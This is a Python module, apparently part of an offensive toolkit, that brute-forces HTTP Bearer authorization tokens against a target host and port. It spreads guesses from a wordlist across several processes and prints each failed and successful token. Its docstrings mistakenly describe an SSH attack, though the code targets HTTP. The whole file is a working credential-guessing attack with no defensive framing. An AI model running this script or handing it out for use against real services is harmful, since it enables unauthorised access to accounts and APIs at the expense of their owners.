import requests, time, multiprocessing
from wordlist import create_wordlist
from display_output import display_output
from termcolor import colored


def brute_force_http_thread(hostname, port, password_list, next_password_index, found_event, password_queue):

    """
    Launch a brute force attack on SSH. The function will create a thread for each password of the wordlist.
    """

    while True:
        # Check if the password has been found
        if found_event.is_set():
            return

        # Retrieve the next password to test
        with next_password_index.get_lock():
            i = next_password_index.value
            # If all passwords have been tested, exit the thread
            if i >= len(password_list):
                return
            # Update the index for the next password
            next_password_index.value += 1

        password = password_list[i]
        token = "Bearer " + password
        headers = {
            "Authorization": token,
            "accept": "application/json"
        }

        url = f"http://{hostname}:{port}/"

        response = requests.get(url=url, headers=headers)
        if response.status_code == 200:
            password_queue.put(password)
            found_event.set()
            print(colored("[$] ", "green") + f"Token : {password}" + colored(" Success", "green"))
            return
        else:
            print(colored("[+] ", "yellow") + f"Token : {password}" + colored(" Failed", "red"))
            pass
        


def brute_force_http(hostname, port, wordlist_path, start, num_threads=4):
    """
    Launch a brute force attack on SSH. The function will create a thread for each password of the wordlist.
    """

    print(colored('[+] Downloading wordlist...', 'yellow'))

    wordlist = create_wordlist(wordlist_path)

    # Create a Value to store the index of the next password to test
    next_password_index = multiprocessing.Value('i', 0)

    # Create an Event to indicate if the password has been found
    found_event = multiprocessing.Event()

    # Create a Queue to store the password if it is found
    password_queue = multiprocessing.Queue()

    # Creating threads
    threads = []
    for i in range(num_threads):
        thread = multiprocessing.Process(target=brute_force_http_thread, args=(hostname, port, wordlist, next_password_index, found_event, password_queue))
        thread.start()
        threads.append(thread)

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

    # If a password has been found, return it
    if not password_queue.empty():
        password = password_queue.get()
        end = time.time()
        all_time = end - start
        print("\n")
        print(colored("[$] Result :", "blue"))
        print(colored(f"Token found : '{password}'", "green"))
        print(colored(f"Time : {all_time} seconds", "green"))

        # Kill all threads
        found_event.set()
        for thread in threads:
            thread.terminate()

        return 0


    # If no password has been found, return None
    end = time.time()
    all_time = end - start
    print("\n")
    print(colored("[+] Result :", "blue"))
    print(colored(f"Token not found in the wordlist", "red"))
    print(colored(f"Time : {all_time} seconds", "red"))

    found_event.set()
    for thread in threads:
        thread.terminate()
    return 1
